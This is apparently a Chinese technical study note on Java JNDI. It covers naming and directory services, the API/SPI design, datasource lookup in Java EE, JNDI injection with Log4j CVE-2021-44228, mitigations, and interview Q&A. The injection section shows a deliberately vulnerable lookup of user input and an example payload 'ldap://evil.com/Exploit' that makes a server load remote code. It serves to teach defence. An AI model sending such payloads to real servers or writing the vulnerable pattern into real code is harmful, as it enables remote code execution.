---
title: JNDI
---

JNDI（Java Naming and Directory Interface）解决的是一个很朴素的问题：**代码不应该硬编码资源的物理位置**。数据库在哪台机器、LDAP 服务器地址是什么、EJB 远程对象怎么找——这些都交给一个统一的名字去指代，由容器在运行时解析。它是 Java EE 里最底层的基础设施之一，也是近年真实爆发过的高危漏洞（JNDI 注入）的载体。

## 命名服务与目录服务

先区分两个概念，它们是 JNDI 名字里两半的来源：

- **命名服务（Naming）**：把名字映射到对象，只支持「按名字查对象」这一种操作，类似一个只读的 Map。例：DNS（域名 → IP）、文件系统（路径 → 文件）。
- **目录服务（Directory）**：是命名服务的增强，对象**带属性**，因此支持按属性检索。例：LDAP、Active Directory。

```text
命名服务：  name              → object
目录服务：  name + attributes → object      （可按属性搜索）
```

JNDI 同时支持两者：`Context` 接口负责命名操作，`DirContext` 在其上增加属性的读写与搜索。

| 接口 | 能力 | 典型实现 |
| --- | --- | --- |
| `Context` | 绑定、查找、解绑、子上下文 | RMI、DNS、文件系统 |
| `DirContext` | 继承 `Context`，增加属性与搜索 | LDAP |
| `InitialContext` | 查找的入口，按环境参数选择 SPI | 全部 |

## 架构：API + SPI

JNDI 的设计是典型的「接口与实现分离」，理解这一点才能解释它为什么既能查 DNS 又能查 LDAP：

- **JNDI API**：`javax.naming` 包，应用程序面向它编程（`Context.lookup()`）。
- **JNDI SPI**（Service Provider Interface）：服务提供者实现的适配层。各厂商提供 SPI 实现，JNDI 通过工厂类把它们接进来。
- **JNDI Provider**：具体实现，如 `com.sun.jndi.ldap.LdapCtxFactory`、`com.sun.jndi.rmi.registry.RegistryContextFactory`、`com.sun.jndi.dns.DnsContextFactory`。

```text
应用代码 → JNDI API(Context) → 命名的 SPI 实现 → 具体服务(DNS/LDAP/RMI/...)
```

好处是应用代码只依赖 `Context` 接口，换后端服务不需要改动。

<div class="note info"><p>「用哪个实现」由查找时提供的环境参数决定：URL 的 scheme（如 <code>ldap://</code>、<code>rmi://</code>、<code>dns://</code>）会匹配对应的 SPI 工厂。<b>这正是 JNDI 注入能够成立的根本原因</b>——名字本身可以携带协议，而协议决定会发起什么网络请求。</p></div>

## 基本 API

```java
// 1. 构建环境参数，可以指定工厂与提供者地址
Hashtable<String, String> env = new Hashtable<>();
env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
env.put(Context.PROVIDER_URL, "ldap://127.0.0.1:389");
env.put(Context.SECURITY_PRINCIPAL, "cn=admin,dc=example,dc=com");
env.put(Context.SECURITY_CREDENTIALS, "password");

// 2. 获取初始上下文
Context ctx = new InitialContext(env);

// 3. 查找
Object obj = ctx.lookup("cn=jy,ou=users,dc=example,dc=com");

// 4. 用完关闭
ctx.close();
```

四个核心操作：`bind`（绑定名字与对象）、`lookup`（按名字取对象）、`rebind`（覆盖绑定）、`unbind`（解绑）。名字支持层级结构，子上下文可以用 `ctx.lookup("a/b/c")` 或 `ctx.createSubcontext("a")` 逐级访问。

查找 DNS 与文件系统也是同一套 API：

```java
// DNS：读一条 MX 记录
Hashtable<String, String> dnsEnv = new Hashtable<>();
dnsEnv.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.dns.DnsContextFactory");
DirContext dns = new InitialDirContext(dnsEnv);
Attributes attrs = dns.getAttributes("example.com", new String[] { "MX" });

// 文件系统：路径即名字
Context fs = new InitialContext();
Object file = fs.lookup("file:///tmp/a.txt");
```

## 在 Java EE 中的作用

JNDI 是 Java EE「容器接管资源」思想的实现手段：**开发者不关心资源从哪来，只按约定的名字去容器里取**。

最典型的场景是数据源。传统写法在 `web.xml` 里声明资源引用，再由容器（Tomcat）绑定实际实现：

```xml
<!-- 应用声明「我要用这个名字的资源」 -->
<resource-ref>
  <res-ref-name>jdbc/UserDS</res-ref-name>
  <res-type>javax.sql.DataSource</res-type>
  <res-auth>Container</res-auth>
</resource-ref>
```

```xml
<!-- Tomcat context.xml：容器决定这个名字指向哪个真实数据源 -->
<Context>
  <Resource name="jdbc/UserDS" auth="Container"
            type="javax.sql.DataSource"
            driverClassName="com.mysql.cj.jdbc.Driver"
            url="jdbc:mysql://127.0.0.1:3306/demo"
            username="root" password="secret"
            maxTotal="20" maxIdle="10" />
</Context>
```

```java
// 代码只认这个名字，换数据库/换机器都不用改
Context ctx = new InitialContext();
DataSource ds = (DataSource) ctx.lookup("java:comp/env/jdbc/UserDS");
try (Connection conn = ds.getConnection()) { /* ... */ }
```

<div class="note info"><p><code>java:comp/env/</code> 是应用私有命名空间，只能访问本应用声明的资源，是推荐写法。直接用 <code>java:comp/env</code> 之外的名字（如裸的 <code>jdbc/UserDS</code>）会走全局命名空间，容易与其他应用冲突，也不利于权限隔离。</p></div>

由此得到的直接收益：**连接池与线程池由容器统一管理**，应用不需要自己维护池化参数；环境差异（开发/测试/生产）体现在容器的配置里，与代码隔离；测试时可以用简单实现替换数据源，而不改动业务代码。

其他用途：

- **EJB 查找**：远程 EJB 通过 JNDI 名字定位（`java:global/...` 或 `java:comp/env/ejb/...`）。
- **JMS 资源**：连接工厂与队列/主题的绑定同样走 JNDI。
- **JMX 与配置**：部分容器用 JNDI 暴露管理对象。

Spring 之后这些场景大多被 `@Resource`、`@Autowired`、`spring.datasource.*` 取代——但底层仍是同一套思想，只是名字解析从容器换成了 Spring 容器以及配置中心。

## 安全问题：JNDI 注入

JNDI 注入的本质是：`lookup()` 的参数如果来自用户输入，攻击者就能**指定协议与目标地址**，让服务端去连接自己控制的服务器。

```java
// 危险写法：名字完全来自用户输入
String name = request.getParameter("name");
Object obj = new InitialContext().lookup(name);
```

攻击者传入 `ldap://evil.com/Exploit` 时，受害服务器会：

1. 按 scheme 选择 LDAP 的 SPI，主动连接 `evil.com:389`。
2. 取回一条属性中带有 `javaCodeBase` / `javaFactory` 的条目。
3. 依据这些属性**下载并实例化远端类**，从而执行任意代码。

<div class="note warning"><p>Log4j2 的 CVE-2021-44228 之所以能打到「看一眼日志就中招」，是因为它的 lookup 功能把日志内容（可能来自用户输入）当成了 JNDI 名字。教训不在于 JNDI 本身有错，而在于<b>把不可信输入当作名字去解析</b>这一模式天然危险。理解这条链路比背诵漏洞编号更有价值。</p></div>

防护措施按优先级：

- **不要用不可信输入做 lookup**。业务上能用白名单枚举，就绝不动态拼接。
- 升级 JDK：较新版本默认关闭了远程类加载（`com.sun.jndi.ldap.object.trustURLCodebase` 等默认 `false`），可以显著降低危害，但不能替代输入校验。
- 限制出网：服务端出站流量做白名单，即使注入成功也无法连回攻击者。
- 关闭/限制 JNDI 能力：应用若完全不用 JNDI，直接禁用相关类加载与远程协议。
- 日志组件保持最新，并关闭消息中的 lookup 解析（Log4j 2.x 的 `%msg{nolookups}` 配置）。

## 面试问答

### JNDI 是什么，为什么需要它？

JNDI 是 Java 的命名与目录服务接口，把资源的位置与代码解耦：代码只使用逻辑名字，由容器或配置决定该名字实际指向哪个资源。好处是环境差异（开发/测试/生产）集中在配置侧，换数据源或迁移机器不需要改代码，同时资源池化（连接池）可以交给容器统一管理。

### JNDI 和 JDBC 是什么关系？

JDBC 负责「怎么连数据库」，JNDI 负责「数据库配置从哪来」。典型用法是通过 JNDI 查找一个 `DataSource`（`java:comp/env/jdbc/xxx`），拿到后再用 JDBC 或 ORM 框架访问数据库。两者是先后关系而非替代关系：JNDI 拿到连接池，JDBC 从池里取连接。

### 命名服务和目录服务的区别？

命名服务只做「名字 → 对象」的映射（如 DNS）；目录服务在对象之外还维护属性，因此支持按属性检索（如 LDAP 可按 `cn`、`mail` 搜索条目）。JNDI 中 `Context` 对应命名操作，`DirContext` 在它之上增加属性读写与 `search()`。

### JNDI 注入的原理是什么？怎么防？

`InitialContext.lookup()` 的参数可控时，攻击者可以传入带任意 scheme 的名字（如 `ldap://`、`rmi://`），让服务端连接攻击者服务器并按远端指示加载类，从而执行任意代码。防护的核心是**不把不可信输入当作 JNDI 名字**，配合升级 JDK（默认禁止远程代码库）、限制服务端出站流量、以及禁用不需要的 JNDI 远程协议。

### 现在还用 JNDI 吗？

直接用得少了：数据源绑定、EJB 查找这些场景已被 Spring 的依赖注入与配置中心取代。但 JNDI 的思想仍在——「用逻辑名字查找资源」今天体现为 `@Value("${xxx}")`、配置中心的 `dataId`、Kubernetes 的 Service 名。存量 Java EE / Spring Boot 传统部署的项目里，`java:comp/env` 形式的查找依然常见。
